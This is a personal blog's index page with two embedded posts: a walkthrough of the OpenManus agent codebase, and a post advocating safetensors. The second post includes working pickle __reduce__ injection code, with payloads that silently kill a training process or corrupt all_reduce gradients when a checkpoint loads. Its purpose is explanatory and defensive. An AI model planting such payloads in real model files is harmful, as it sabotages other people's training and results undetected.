<!DOCTYPE html><html><head><meta charSet="utf-8"/><title>Shenggui Li</title><meta name="robots" content="index,follow"/><meta name="description" content="Personal website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@frankkklee"/><meta name="twitter:creator" content="@frankkklee"/><meta property="og:title" content="Shenggui Li"/><meta property="og:description" content="Personal website"/><meta property="og:url" content="https://franklee.xyz/"/><meta property="og:type" content="website"/><meta property="og:image" content="https://franklee.xyz/assets/logo.png"/><meta property="og:image:alt" content="Shenggui Li"/><meta property="og:locale" content="en_IE"/><meta property="og:site_name" content="Shenggui Li"/><link rel="canonical" href="https://franklee.xyz/"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="next-head-count" content="17"/><meta charSet="utf-8"/><meta name="keywords" content="Shenggui Li, Li Shenggui, Shenggui, Frank Lee, FrankLeeeeee, NTU"/><meta name="theme-color" content="#000000"/><link rel="icon" href="/favicon.ico"/><link rel="manifest" href="/manifest.json"/><link rel="preload" href="/_next/static/media/630c17af355fa44e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/_next/static/css/5896d3e93c441ca3.css" as="style"/><link rel="stylesheet" href="/_next/static/css/5896d3e93c441ca3.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/_next/static/chunks/webpack-59c5c889f52620d6.js" defer=""></script><script src="/_next/static/chunks/framework-ff7f418116f76b2d.js" defer=""></script><script src="/_next/static/chunks/main-dacc7e304366e363.js" defer=""></script><script src="/_next/static/chunks/pages/_app-8a1ebdd2fac623c9.js" defer=""></script><script src="/_next/static/chunks/72-d3a1a5b5749a0dfe.js" defer=""></script><script src="/_next/static/chunks/pages/blogs-745b6a5e4e924abc.js" defer=""></script><script src="/_next/static/HNYm-8xpJDnHM7ohpU4kw/_buildManifest.js" defer=""></script><script src="/_next/static/HNYm-8xpJDnHM7ohpU4kw/_ssgManifest.js" defer=""></script></head><body><div id="__next"><main class="__className_4f7708"><nav class="bg-black shadow" data-headlessui-state=""><div class="mx-auto max-w-7xl px-2 sm:px-4 lg:px-8"><div class="flex h-16 justify-between"><div class="flex px-2 lg:px-0"><div class="flex flex-shrink-0 items-center"><img class="block h-16 w-auto md:hidden" src="/assets/logo.png" alt="Your Company"/><img class="hidden h-16 w-auto md:block" src="/assets/logo.png" alt="Your Company"/></div></div><div class="hidden items-center md:ml-6 md:space-x-8 md:flex md:flex-1  md:justify-end"><a class="inline-flex items-center px-1 pt-1 text-sm font-medium text-slate-200" href="/">Home</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200" href="/about">About</a><a class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/blogs">Blogs</a><a target="_blank" rel="noopener noreferrer" class="inline-flex items-center border-b-2 border-transparent px-1 pt-1 text-sm font-medium text-slate-200 " href="/assets/cv.pdf">CV</a></div><div class="flex items-center md:hidden"><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-100 hover:text-gray-500 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-indigo-500" id="headlessui-disclosure-button-:R6m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open main menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><div class="container mx-auto py-8 px-8 md:px-16 lg:px-36"><div class="mb-8"><h1 class="text-slate-200 text-4xl pb-4"><strong class="purple">My Blogs<!-- --> </strong></h1><div><div><div class="grid grid-cols-1 gap-4"><div class="animate-fade animate-once animate-duration-500 animate-ease-in"><div><div class="col-span-1 shadow-sm"><div class="flex"><img src="https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/cover.png" alt="blog" lazy="loading" class="object-cover w-16 h-16 md:h-24 md:w-24 lg:h-32 lg:w-32 object-cover rounded-l-md"/><div class="flex flex-1 items-center justify-between truncate rounded-r-md border-l border-gray-300 bg-white"><div class="flex-1 truncate px-4 py-2 text-xs md:text-sm"><a class="text-base md:text-2xl font-medium text-black hover:text-blue-400 text-wrap" href="/blogs/2025-04-27-open-manus">Understanding OpenManus: How Agent Systems Work</a><p class="text-gray-500 line-clamp-1 truncate">Discover how agent systems like OpenManus plan, coordinate, and adapt to complete complex tasks</p><div class="flex space-x-2 text-gray-500"><p>16 min read</p><p>â€¢</p><p>2025-04-27</p></div><div class="flex flex-wrap gap-2 mt-1"><p class="rounded px-1 border border-gray-300 text-gray-500 hover:text-gray-800 hover:border-gray-400">agent</p><p class="rounded px-1 border border-gray-300 text-gray-500 hover:text-gray-800 hover:border-gray-400">open-source</p><p class="rounded px-1 border border-gray-300 text-gray-500 hover:text-gray-800 hover:border-gray-400">LLM</p></div></div></div></div></div></div></div><div class="animate-fade animate-once animate-duration-500 animate-ease-in"><div><div class="col-span-1 shadow-sm"><div class="flex"><img src="https://franklee.xyz/public_assets/blog_media/2024-10-19-safetensor/cover.png" alt="blog" lazy="loading" class="object-cover w-16 h-16 md:h-24 md:w-24 lg:h-32 lg:w-32 object-cover rounded-l-md"/><div class="flex flex-1 items-center justify-between truncate rounded-r-md border-l border-gray-300 bg-white"><div class="flex-1 truncate px-4 py-2 text-xs md:text-sm"><a class="text-base md:text-2xl font-medium text-black hover:text-blue-400 text-wrap" href="/blogs/2024-10-19-safetensor">Why do we need Hugging Face&#x27;s SafeTensor?</a><p class="text-gray-500 line-clamp-1 truncate">Malicious code can be injected in your model weights and safetensors is all you need.</p><div class="flex space-x-2 text-gray-500"><p>5 min read</p><p>â€¢</p><p>2024-10-19</p></div><div class="flex flex-wrap gap-2 mt-1"><p class="rounded px-1 border border-gray-300 text-gray-500 hover:text-gray-800 hover:border-gray-400">deep learning</p><p class="rounded px-1 border border-gray-300 text-gray-500 hover:text-gray-800 hover:border-gray-400">security</p></div></div></div></div></div></div></div></div></div></div></div><nav class="flex items-center justify-between border-t border-gray-200 px-4 sm:px-0"><div class="-mt-px flex w-0 flex-1"><button class="inline-flex items-center border-t-2 border-transparent pr-1 pt-4 text-sm font-medium text-gray-500 hover:border-gray-300 hover:text-gray-700"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="mr-3 h-5 w-5 text-gray-400"><path fill-rule="evenodd" d="M18 10a.75.75 0 01-.75.75H4.66l2.1 1.95a.75.75 0 11-1.02 1.1l-3.5-3.25a.75.75 0 010-1.1l3.5-3.25a.75.75 0 111.02 1.1l-2.1 1.95h12.59A.75.75 0 0118 10z" clip-rule="evenodd"></path></svg>Previous</button></div><div class="hidden md:-mt-px md:flex"><a href="?page=1" class="text-blue-400 inline-flex items-center px-4 pt-4 text-sm font-medium">1</a></div><div class="-mt-px flex w-0 flex-1 justify-end"><button class="inline-flex items-center border-t-2 border-transparent pl-1 pt-4 text-sm font-medium text-gray-500 hover:border-gray-300 hover:text-gray-700">Next<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-3 h-5 w-5 text-gray-400"><path fill-rule="evenodd" d="M2 10a.75.75 0 01.75-.75h12.59l-2.1-1.95a.75.75 0 111.02-1.1l3.5 3.25a.75.75 0 010 1.1l-3.5 3.25a.75.75 0 11-1.02-1.1l2.1-1.95H2.75A.75.75 0 012 10z" clip-rule="evenodd"></path></svg></button></div></nav></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"blogs":[{"slug":"2025-04-27-open-manus","title":"Understanding OpenManus: How Agent Systems Work","description":"Discover how agent systems like OpenManus plan, coordinate, and adapt to complete complex tasks","date":"2025-04-27","timeReading":{"text":"16 min read","minutes":15.845,"time":950700,"words":3169},"ogImage":{"url":"https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/cover.png"},"content":"\nRecently, a new company called Bufferfly Effect has raised 75 million USD from well-known investors such as Benchmark Capital. You might not have heard of this company, but you probably have heard its LLM agent product - Manus, which went viral on social media last month. I was given an invitation code to Manus by my investor friend during its debut in early March. As an agent novice user, I was quite impressed by how the product was constructed, including its automation capability and user experience. I asked Manus to help me plan a trip to Japan and Manus demonstrated its work progress step by step and it is able to deliver a complete trip plan after 20 minutes (the speed can still be improved). Just like DeepSeek, Manus showcased what it actually did in a sandbox, being it a terminal or browser. I believe this kind of visualization of chain of thought \u0026 action is what makes this product favoured by many users.\n\n\u003cp\u003e\n    \u003cimg src=\"https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/manus.jpeg\" alt\u003e\n    \u003ccenter\u003e\n    \u003cem\u003eManus planning a trip to Japan\u003c/em\u003e\n    \u003c/center\u003e\n\u003c/p\u003e\n\nAs a researcher in machine learning system, I spend my time on how to make AI more efficient and have limited knowledge on how agent systems work. Luckily, the open-source project [OpenManus](https://github.com/mannaandpoem/OpenManus) has made efforts to reproduce Manus and this gives me a opportunity to take a look at the inner working of agent systems.\n\nThis blog post is a summary of my exploration on OpenManus while reading through the source code and I hope it gives you a brief introduction to agent systems if you are also a beginner like me.\n\nDo note that the `Open-Manus` project is constantly evolving and my blog is only specific to its codebase in April 2025.\n\n## Prerequisites\n\nBefore we dive into the details of OpenManus, there are some background knowledge that you should know.\n\n### 1. Agent System\n\nAn agent is an autonomous system designed to perceive its environment, make decisions, and take actions to achieve specific goals without continuous human intervention. With the advent of ChatGPT, it is a common goal for the AI community to build a smart personal assistant that can help with daily tasks for everyone. Agent systems are the key to achieve this goal. Simply speaking, an agent system can help to plan, reason, make decision, and take action on your behalf to achieve a specific goal for you.\n\n### 2. ReAct Agent\n\nReAct agent is a simple but useful concept in agent, proposed by the OpenAI researcher Shunyu Yao. It combines both reasoning and execution in an interleaved manner to improve the agent's performance in tasks. ReAct agents iteratively think and reason about the current task, and then decide whether to use tools to complete the current task. If the tools are needed, it will take the action and update the internal state. The general workflow is shown below.\n\n![Manus](https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/react.png)\n\n### 3. Function Calling\n\nFunction calling is LLM's ability to decide which function/tool to use and what parameters to provide to the function call when given a context and a list of function descriptions. This allows the model to dynamically select the suitable tools for a specific task. The user needs to define functions in a specific format such as:\n\n```python\nfrom openai import OpenAI\n\nclient = OpenAI(api_key=\"your-key\")\n\nweather_tool = {\n    \"type\": \"function\",\n    \"function\": {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current temperature for a given location.\",\n        \"parameters\": {\n            \"type\": \"object\",\n            \"properties\": {\n                \"location\": {\n                    \"type\": \"string\",\n                    \"description\": \"City and country e.g. BogotÃ¡, Colombia\"\n                }\n            },\n            \"required\": [\n                \"location\"\n            ],\n            \"additionalProperties\": False\n        }\n    }\n}\n```\n\nWe can then call the OpenAI APIs with the `tools` field.\n\n```python\nresponse = client.chat.completions.create(\n    model=\"gpt-4.1\",\n    messages=[{\"role\": \"user\", \"content\": \"What is the weather like in Paris today?\"}],\n    tools=[weather_tool]\n)\n\nprint(response.choices[0].message.tool_calls)\n```\n\nThe API will return a response like below. The response contains the name(s) of the function(s) to use, and the corresponding parameters structured in json format. In this way, the developer can look up for the actual function code and execute that function with the given parameters.\n\n```text\n[\n    ChatCompletionMessageToolCall(\n        id='call_xFu1qgsnPzzviCxNvDNcXf41',\n        function=Function(\n            arguments='{\"location\":\"Paris, France\"}',\n            name='get_weather'\n        ),\n        type='function'\n    )\n]\n```\n\n### 4. Browser-User\n\n[Browser-use](https://github.com/browser-use/browser-use) is a python package which manipulates and interacts with a web browser in real time. It is built upon the testing framework playwright. In browser-use, it has its own agent system built in the package, however, OpenManus mainly uses it Browser function and has written its own browser interaction logic.\n\n## Code Walkthrough\n\nIn this section, I will briefly go through the high-level project structure and explain how each component works. Afterwards, I will discuss how each components work together to deliver a complete agent system.\n\n### Core Modules\n\nThis subsection cover the major modules in the OpenManus project. Each module is a collection of classes responsible for different functionalities, which will be covered in detail below.\n\n#### Agents\n\n![Agents](https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/agent.png)\n\nThe [agent](https://github.com/mannaandpoem/OpenManus/tree/main/app/agent) module is the entrypoint of the agent system. It is responsible for the overall workflow of the agent system. As shown in the diagram above, the agents are organized in a hierarchical structure and the `ReActAgent` and `ToolCallAgent` define the core logic flow for task automation. Each class' duty is explained below:\n\n1. BaseAgent\n\n   This is the most fundamental class of an agent, it mainly takes care of the properties and states of the agent. For example, it has a name and description and also a system prompt to interact with the LLMs. The run method is the entrypoint of this agent, in run, the agent basically runs the step method repeatedly until its agent becomes FINISHED or IDLE.\n\n   - Finished: means the agent has finished the task\n   - IDLE: means the agent has not finished the task but has reached the max number of steps, so it is forced to terminate\n\n   The `step` method is an abstract method which the inherited classes will implement to define how each iteration goes.\n\n2. ReActAgent\n\n   This class inherits BaseAgent and implements the step method. It uses the ReAct agent idea to combine both reasoning and action. Its step logic is like:\n\n   ```python\n   async def step(self) -\u003e str:\n       \"\"\"Execute a single step: think and act.\"\"\"\n       should_act = await self.think()\n       if not should_act:\n           return \"Thinking complete - no action needed\"\n       return await self.act()\n   ```\n\n   Both the think and act methods are abstract.\n\n3. ToolCallAgent\n\n   ToolCallAgent includes the use of tools in the thinking and acting stages of a ReAct agent. In the thinking stage, it passes the available tools to LLM and let LLM to choose the suitable tools to use and the corresponding parameters via **functional calling**.\n\n   ```python\n   async def think(self) -\u003e bool:\n   ...\n\n       response = await self.llm.ask_tool(\n           messages=self.messages,\n           system_msgs=(\n               [Message.system_message(self.system_prompt)]\n               if self.system_prompt\n               else None\n           ),\n           tools=self.available_tools.to_params(),\n           tool_choice=self.tool_choices,\n       )\n       ...\n   ```\n\n   In the acting stage, the agent will call the tool in order with the parameters given in the LLM response. The tool outputs are concatenated as the final output.\n\n   ```python\n   async def act(self) -\u003e str:\n   \"\"\"Execute tool calls and handle their results\"\"\"\n   if not self.tool_calls:\n   if self.tool_choices == ToolChoice.REQUIRED:\n   raise ValueError(TOOL_CALL_REQUIRED)\n\n           # Return last message content if no tool calls\n           return self.messages[-1].content or \"No content or commands to execute\"\n\n       results = []\n       for command in self.tool_calls:\n           # Reset base64_image for each tool call\n           self._current_base64_image = None\n\n           result = await self.execute_tool(command)\n\n           if self.max_observe:\n               result = result[: self.max_observe]\n\n           logger.info(\n               f\"ðŸŽ¯ Tool '{command.function.name}' completed its mission! Result: {result}\"\n           )\n\n           # Add tool response to memory\n           tool_msg = Message.tool_message(\n               content=result,\n               tool_call_id=command.id,\n               name=command.function.name,\n               base64_image=self._current_base64_image,\n           )\n           self.memory.add_message(tool_msg)\n           results.append(result)\n\n       return \"\\n\\n\".join(results)\n   ```\n\n4. Manus\n\n   `Manus` is the main agent in the Open-Manus system. It is different from the ToolCallAgent as it processes the prompt a bit before thinking. As shown in the code below, Manus will check if browser was used in the last 3 messages. If yes, it will format the prompt by injecting the current browser's state information (e.g. text, buttons, tabs, etc.) into the prompt. This allows the LLM to do a better job in function calling as it is aware of the content on the browser and can choose what action to perform on the browser.\n\n   ```python\n   async def think(self) -\u003e bool:\n       \"\"\"Process current state and decide next actions with appropriate context.\"\"\"\n       original_prompt = self.next_step_prompt\n       recent_messages = self.memory.messages[-3:] if self.memory.messages else []\n       browser_in_use = any(\n       tc.function.name == BrowserUseTool().name\n       for msg in recent_messages\n       if msg.tool_calls\n       for tc in msg.tool_calls\n       )\n\n       if browser_in_use:\n           self.next_step_prompt = (\n               await self.browser_context_helper.format_next_step_prompt()\n           )\n\n       result = await super().think()\n\n       # Restore original prompt\n       self.next_step_prompt = original_prompt\n\n       return result\n   ```\n\n5. BrowserAgent\n\n   This agent is implemented, but I don't see it being used anywhere. Moreover, its functionality significantly overlaps with the BrowserUseTool in 2. Tool, so I will skip it for now.\n\n6. MCPAgent \u0026 SWEAgent\n\n   MCPAgent uses MCP servers as tools, and SWEAgent is just a different system prompt, so we skip them here.\n\n#### Tools\n\n![Tools](https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/tools.png)\n\nThe `tools` module implements a collection to external tools which can be used by the agent to retrive information and reason.\n\n1. Bash\n\n   This tool creates a bash session using `asyncio.create_subprocess_shell`, and receives bash command for execution. It then return the log in shell as output.\n\n2. BrowserUseTool\n\n   It relies on the browser-use package to control the browser and execute commands such as `go_to_url`, `click_element`, `input_text`, and so on. If the comand is extract_content, it will use markdownify to convert to the page content into Markdown text and use LLM to extract the text according to a goal given by the inputs.\n\n3. CreateChatCompletiton\n\n   This tool does not actually perform chat completion, instead, it only extracts the necessary fields from a response data. When calling `execute`, the tool receives a list of strings (field names) and the response data and only keep the part of the data in the response according to the required fields.\n\n4. DeepResearch\n\n   The Deep Research tool is a tool that can be used to perform a complete research cycle. It can be seen as an extension of the chat completion and web search by following the following steps:\n\n   - Optimize the search query using LLM\n   - Perform a complete research cycle:\n   - Search on the web\n   - Extract insights using LLM\n   - Generate follow-up queries and research with follow-up queries\n   - Return research summary stored in context\n\n5. MCPClientTool\n\n   Init a MCP connection and send request to the MCP server.\n\n6. PlanningTool\n\n   This tool does not perform planning on its own, it is more like a planning manager, which takes care of the CRUD operations of planning.\n\n7. PythonExecute\n\n   It takes a code string and executes this piece of code in a new process and returns its output as result.\n\n8. StrReplaceEditor\n\n   This tool is used for viewing, creating and editing files locally or in sandbox. This class basically abstracts the file operations and expose these operations as commands to the client calling this tool.\n\n9. Terminate\n\n   This is a dummy tool, which only returns an ending message to convey the status of the task.\n\n10. WebSearch\n\n    It basically conducts search on all available search engines including google, baidu, duckduckgo, and bing. Google is set as the preferred engine so it will be used first. These search engine results will only include meta information like position, title and URL. The tool will then fetch the content of the web pages and return as response.\n\n#### Sandbox\n\nThe sandbox module is responsible for creating an isolated environment for the agent to execute the task. It is a wrapper for the Docker SDK and provides a unified interface for the agent to interact with the sandbox.\n\n![  ](https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/sandbox.png)\n\n1. BaseSandboxClient\n\n   This is an interface for sandbox, which defines the methods for child classes to implement, these methods include file operations and run_command.\n\n2. LocalSandbox\n\n   This is a child class for BaseSandboxClient and also a wrapper for DockerSandbox. It call the methods in DockerSandbox to implement the abstract methods.\n\n3. DockerSandbox\n\n   This class is wrapper for the Docker Python SDK as it contains a DockerClient object, it use this client to implement methods such as file operations. run_command is achieved by using the AsyncDockerizedTerminal.\n\n4. AsyncDockerizedTerminal\n\n   This object basically creates a Docker container session and send the command to the session and retrieve the command output.\n\n5. DockerSession\n\n   This object uses the Docker APIClient to interact with an existing container. It can exec into the container by exec_create to get an interactive session. Then, it uses exec_start to create a socket connection with the session, sending the command and retrieving console output via socket.\n\n#### Memory\n\nMemory is a module that manages the conversation history (context) of the agent. It is responsible for storing the messages and the states of the agent.\n\n![Memory](https://franklee.xyz/public_assets/blog_media/2025-04-27-open-manus/memory.png)\n\n1. Message\n\n   Message represents the chat message in a conversation. It can be from the system, user, assistant or tool.\n\n2. Memory\n\n   Memory is basically a list of messages in history. It is limited by the max_messagse size and uses a FIFO eviction policy.\n\n### Collective Logic\n\n#### What is OpenManus' workflow?\n\nManus carries out work in 4 steps:\n\n1.  Initialization stage\n\n    Manus inherits the `ToolCallAgent` class, during initialization, it will set some basic properties such as name, system prompt, next step prompt and list the available tools it can use. In Manus, the available tools inlcude `PythonExecute`, `BrowserUseTool`, `StrReplaceEditor` and `Terminate`.\n\n    ```python\n    class Manus(ToolCallAgent):\n    \"\"\"A versatile general-purpose agent.\"\"\"\n\n        name: str = \"Manus\"\n        description: str = (\n            \"A versatile agent that can solve various tasks using multiple tools\"\n        )\n\n        system_prompt: str = SYSTEM_PROMPT.format(directory=config.workspace_root)\n        next_step_prompt: str = NEXT_STEP_PROMPT\n\n        max_observe: int = 10000\n        max_steps: int = 20\n\n        # Add general-purpose tools to the tool collection\n        available_tools: ToolCollection = Field(\n            default_factory=lambda: ToolCollection(\n                PythonExecute(), BrowserUseTool(), StrReplaceEditor(), Terminate()\n            )\n        )\n\n        special_tool_names: list[str] = Field(default_factory=lambda: [Terminate().name])\n\n        browser_context_helper: Optional[BrowserContextHelper] = None\n    ```\n\n2.  Thinking Stage\n\n    This is the first stage of a ReAct agent, Manus will think about its next move based on the current and recent messages. In Manus, it handles the browser-use specifically: if there is any recent use of browser, it will format the next step prompt, `browser_context_helper.format_next_step_prompt` will inject the current states of the browser into the prompt, the states include URL, tabs, clickable elements and so on.\n\n    It then calls its parent class `ToolCallAgent`'s thinking method. In this method, Manus calls LLM to think about the next action. at the same time, the available tools are given to LLMs for function calling as well, so LLM will select the suitable tools to use for the next action.\n\n- Acting Stage\n\n  In this stage, Manus calls the tools if there is any.\n\n- Looping Stage\n\n  The thinking and acting stages are wrapped in the run method of Manus. This method runs a for loop to repeat thinking and acting stages until the state becomes finished or the maximum step has been reached.\n\n  ```python\n  async def run(self, request: Optional[str] = None) -\u003e str:\n    if self.state != AgentState.IDLE:\n        raise RuntimeError(f\"Cannot run agent from state: {self.state}\")\n    if request:\n        self.update_memory(\"user\", request)\n    results: List[str] = []\n    async with self.state_context(AgentState.RUNNING):\n        while (\n            self.current_step \u003c self.max_steps and self.state != AgentState.FINISHED\n        ):\n            self.current_step += 1\n            logger.info(f\"Executing step {self.current_step}/{self.max_steps}\")\n            step_result = await self.step()\n            if self.is_stuck():\n                self.handle_stuck_state()\n            results.append(f\"Step {self.current_step}: {step_result}\")\n        if self.current_step \u003e= self.max_steps:\n            self.current_step = 0\n            self.state = AgentState.IDLE\n            results.append(f\"Terminated: Reached max steps ({self.max_steps})\")\n    await SANDBOX_CLIENT.cleanup()\n    return \"\\n\".join(results) if results else \"No steps executed\"\n  ```\n\n- Cleanup Stage\n\n  In this stage, Manus will clear up the resources used during the task such as the browser.\n\n#### How does OpenManus interact with the tools?\n\nTo understand this, we can separate it into two questions:\n\n- How does manus know which tool to use?\n- How does manus invoke the tool?\n\nThese two questions indeed correspond to the thinking and acting stages as mentioned above. During the thinking stage, Manus will use the function calling feature of the LLM API to let the model decide the usable tools and parameters. During the acting stage, Manus will iterate over the tool list and feed each tool function with its parameters and fetch the result.\n\n#### How does OpenManus interact with the browser?\n\nManus does not use VLM to decide which elements to click or where is the URL bar. Instead, browser-use will return these information as browser states and the states are organized as a dictionary. For example, each clickable element in the DOM tree is converted to a string, and these states are given to LLM as context for the LLM to select which element to click.\n\n```python\nasync def get_current_state(\n        self, context: Optional[BrowserContext] = None\n    ) -\u003e ToolResult:\n        \"\"\"\n        Get the current browser state as a ToolResult.\n        If context is not provided, uses self.context.\n        \"\"\"\n        try:\n            # Use provided context or fall back to self.context\n            ctx = context or self.context\n            if not ctx:\n                return ToolResult(error=\"Browser context not initialized\")\n\n            state = await ctx.get_state()\n\n            # Create a viewport_info dictionary if it doesn't exist\n            viewport_height = 0\n            if hasattr(state, \"viewport_info\") and state.viewport_info:\n                viewport_height = state.viewport_info.height\n            elif hasattr(ctx, \"config\") and hasattr(ctx.config, \"browser_window_size\"):\n                viewport_height = ctx.config.browser_window_size.get(\"height\", 0)\n\n            # Take a screenshot for the state\n            page = await ctx.get_current_page()\n\n            await page.bring_to_front()\n            await page.wait_for_load_state()\n\n            screenshot = await page.screenshot(\n                full_page=True, animations=\"disabled\", type=\"jpeg\", quality=100\n            )\n\n            screenshot = base64.b64encode(screenshot).decode(\"utf-8\")\n\n            # Build the state info with all required fields\n            state_info = {\n                \"url\": state.url,\n                \"title\": state.title,\n                \"tabs\": [tab.model_dump() for tab in state.tabs],\n                \"help\": \"[0], [1], [2], etc., represent clickable indices corresponding to the elements listed. Clicking on these indices will navigate to or interact with the respective content behind them.\",\n                \"interactive_elements\": (\n                    state.element_tree.clickable_elements_to_string()\n                    if state.element_tree\n                    else \"\"\n                ),\n                \"scroll_info\": {\n                    \"pixels_above\": getattr(state, \"pixels_above\", 0),\n                    \"pixels_below\": getattr(state, \"pixels_below\", 0),\n                    \"total_height\": getattr(state, \"pixels_above\", 0)\n                    + getattr(state, \"pixels_below\", 0)\n                    + viewport_height,\n                },\n                \"viewport_height\": viewport_height,\n            }\n\n            return ToolResult(\n                output=json.dumps(state_info, indent=4, ensure_ascii=False),\n                base64_image=screenshot,\n            )\n        except Exception as e:\n            return ToolResult(error=f\"Failed to get browser state: {str(e)}\")\n```\n\nThe LLM will then return the index of the element to click after function calling query, Manus will then get the element by index and perform click action.\n\n```python\nelif action == \"click_element\":\n    if index is None:\n        return ToolResult(\n            error=\"Index is required for 'click_element' action\"\n        )\n    element = await context.get_dom_element_by_index(index)\n    if not element:\n        return ToolResult(error=f\"Element with index {index} not found\")\n    download_path = await context._click_element_node(element)\n    output = f\"Clicked element at index {index}\"\n    if download_path:\n        output += f\" - Downloaded file to {download_path}\"\n    return ToolResult(output=output)\n```\n\n#### How does Manus manage its memory?\n\nManus adds the following content to memory in order:\n\n- Before the thinking stage, Manusadds the user request content into memory at the beginning of the run method\n- During the think stage, Manusadds the LLM response to memory. If there is any exception, the exception is added to memory as well.\n- During the acting stage, Manus adds the tool response message to memory.\n\n## Conclusion\n\nBy walking through the fundamental ideas and some high-level code review, I hope that you should have a rough idea of how OpenManus works now. However, I can't say that everything in this blog post is correct as I am still a novice in agent, do let me know if there is any error to rectify.\n\n## References\n\n- [Manus](https://manus.im/app)\n- [OpenManus](https://github.com/mannaandpoem/OpenManus)\n- [ReAct-Langchain](https://python.langchain.com/v0.1/docs/modules/agents/agent_types/react/)\n- [ReAct: Synergizing Reasoning and Acting in Language Models](https://arxiv.org/pdf/2210.03629)\n","tags":["agent","open-source","LLM"]},{"slug":"2024-10-19-safetensor","title":"Why do we need Hugging Face's SafeTensor?","description":"Malicious code can be injected in your model weights and safetensors is all you need.","date":"2024-10-19","timeReading":{"text":"5 min read","minutes":4.505,"time":270300,"words":901},"ogImage":{"url":"https://franklee.xyz/public_assets/blog_media/2024-10-19-safetensor/cover.png"},"content":"\nA long time ago, a very simple question came to my mind when I was reading a bunch of Hugging Face's documentation - what does Hugging Face's Safetensor do? The term \"Safetensor\" appears in many places in the Hugging Face's documentation but people rarely talk about it and discuss its purpose. Recently, there was a security affair which affected a team's model training progress and this prompts me to revisit this question and write this blog. It should be noted that this blog is not a discussion of the affair but rather the technical advocation for the use of safetensors to protect your models, which are the most important assets in the AI era.\n\n## What's wrong with the current model storage?\n\nWhen we train a model, we often save the model weights to a file for checkpointing and later loading. The most popular format for this is the PyTorch state dictionary, which is a Python dictionary object mapping each layer to its parameter tensor. I guess most of you are familiar with the following code snippet:\n\n```python\n# save model weights\nstate_dict = model.state_dict()\ntorch.save(state_dict, \"model.pt\")\n\n# load model weights\nstate_dict = torch.load(\"model.pt\")\nmodel.load_state_dict(state_dict)\n```\n\nHowever, this method uses `pickle` to serialize and deserialize the entire state dict object, raising concerns over its security. The reason is that `pickle` is not secure against erroneous or maliciously constructed data. It may load arbitrary code with the same privileges as the program that is deserializing the data. In this way, the attacker can inject arbitrary code into the model weights and cause serious security issues. One way to hack the models weights is to modify its `__reduce__` method to execute arbitrary code.\n\n```python\nclass Obj:\n\n    def __reduce__(self):\n        return (exec, (\"print('hello')\",))\n```\n\nIf you serialize this object and save it to a file, the code will be executed when you load the object. That is, you will see a \"hello\" statement printed when you load the object.\n\nWith this in mind, we can basically manipulate many parts of the program, including imported libraries and local variables. I have provided two typical senarios where your training process can be interrupted and the arithmetic correctness of the model weights can be tampered with. You can also find the example code in my [blog notes](https://github.com/FrankLeeeee/Blog-Notes/tree/main/2024-10-19-safetensor).\n\n### Scenario 1: Automatically shut down the training process\n\nAs we can see in the \"hello\" example above, the malicious code is written as a code string. Similarly, we can prepare the following code string to create a new thread, which kills the parent process after 5 seconds. This thread works at the background so the user won't notice anything and `os.kill` does not return any error trace, which makes it hard to detect the malicious code.\n\n```python\nAUTO_SHUTDOWN = \"\"\"\nimport os\nimport threading\nfrom functools import partial\n\n# get the process ID\npid = os.getpid()\n\ndef inject_code(pid: int):\n    import time\n    import os\n    time.sleep(5)\n    os.kill(pid, 9)\n\nwrapped_fn = partial(inject_code, pid)\ninjection_thread = threading.Thread(target=wrapped_fn)\ninjection_thread.start()\n\"\"\"\n```\n\nNext, we need to inject this code into the state dict object. As a result, when we load the model weights from disk, the code will be executed and the training process will be interrupted.\n\n```python\ndef inject_malicious_code(obj, code_str):\n    # bind a reduce fn to weights\n    def reduce(self):\n        return (exec, (code_str, ))\n\n    # bind the reduce fn to the weights's __reduce__ method\n    bound_reduce = reduce.__get__(obj, obj.__class__)\n    setattr(obj, \"__reduce__\", bound_reduce)\n    return obj\n\nstate_dict = inject_malicious_code(state_dict, AUTO_SHUTDOWN)\n```\n\n### Scenario 2: Introduce errors in collective communication\n\nSimilarly, if we want to modify the behaviour of the collective communication operations, we can introduce errors in its computation so that the gradients will never be correct in distributed training. We can prepare the following code string to hijack the `all_reduce` function. This code string monkey patches the `all_reduce` API in the `torch.distributed` module and adds 1 to the tensor in place. As a result, the all-reduce results will be larger than the expected results.\n\n```python\nHIJACK_ALL_REDUCE = \"\"\"\nimport torch.distributed as dist\n\ndist._origin_all_reduce = dist.all_reduce\ndef hijacked_all_reduce(tensor, *args, **kwargs):\n    import torch.distributed as dist\n    tensor = tensor.add_(1)\n    return dist._origin_all_reduce(tensor, *args, **kwargs)\n\nsetattr(dist, \"all_reduce\", hijacked_all_reduce)\n\"\"\"\n```\n\nFor example, if you have 2 processes and each process is holidng a tensor `[0, 1, 2, 3]`, the all-reduce operation will sum up the tensors from each process and the result will be `[0, 2, 4, 6]`. However, if the attacker injects the malicious code, the result will be `[2, 